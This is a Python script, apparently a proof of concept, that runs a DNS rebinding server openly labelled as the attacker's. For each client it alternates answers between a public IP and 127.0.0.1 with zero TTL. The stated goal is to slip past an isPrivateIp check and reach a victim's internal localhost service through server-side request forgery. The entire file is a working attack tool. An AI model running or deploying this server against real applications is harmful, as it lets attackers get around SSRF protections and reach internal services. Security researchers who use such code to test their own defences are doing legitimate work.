#!/usr/bin/env python3
"""
ATTACKER'S DNS REBINDING SERVER
================================
Alternates between:
- Query 1: 8.8.8.8 (public IP - passes isPrivateIp check)
- Query 2: 127.0.0.1 (localhost - SSRF to victim's internal service)

Run with: python3 attacker_dns_server.py
"""

import socket
import struct
from collections import defaultdict

PUBLIC_IP = "8.8.8.8"
PRIVATE_IP = "127.0.0.1"
DNS_PORT = 5454

query_count = defaultdict(int)

def ip_to_bytes(ip):
    return bytes(int(x) for x in ip.split('.'))

def build_response(query, ip):
    # Transaction ID (2 bytes)
    response = query[:2]
    
    # Flags: Standard response, no error
    response += struct.pack(">H", 0x8180)
    
    # Questions: 1, Answers: 1, Authority: 0, Additional: 0
    response += struct.pack(">HHHH", 1, 1, 0, 0)
    
    # Copy question section
    q_end = 12
    while query[q_end] != 0:
        q_end += 1
    q_end += 5  # null + type (2) + class (2)
    response += query[12:q_end]
    
    # Answer: pointer to name + type A + class IN + TTL 0 + IP
    response += struct.pack(">H", 0xc00c)  # Name pointer
    response += struct.pack(">HH", 1, 1)    # Type A, Class IN
    response += struct.pack(">I", 0)        # TTL = 0 (no caching!)
    response += struct.pack(">H", 4)        # Data length
    response += ip_to_bytes(ip)
    
    return response

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', DNS_PORT))
    
    print("=" * 60)
    print(" ATTACKER DNS REBINDING SERVER")
    print("=" * 60)
    print(f"\nListening on port {DNS_PORT}")
    print(f"\nPattern:")
    print(f"  Query 1: {PUBLIC_IP} (passes isPrivateIp)")
    print(f"  Query 2: {PRIVATE_IP} (SSRF target)")
    print("=" * 60)
    
    while True:
        data, addr = sock.recvfrom(512)
        
        query_count[addr[0]] += 1
        count = query_count[addr[0]]
        
        # Alternate: odd = public, even = private
        ip = PUBLIC_IP if count % 2 == 1 else PRIVATE_IP
        
        print(f"[ATTACKER] Query #{count} from {addr[0]} -> responding with {ip}")
        
        response = build_response(data, ip)
        sock.sendto(response, addr)

if __name__ == "__main__":
    main()
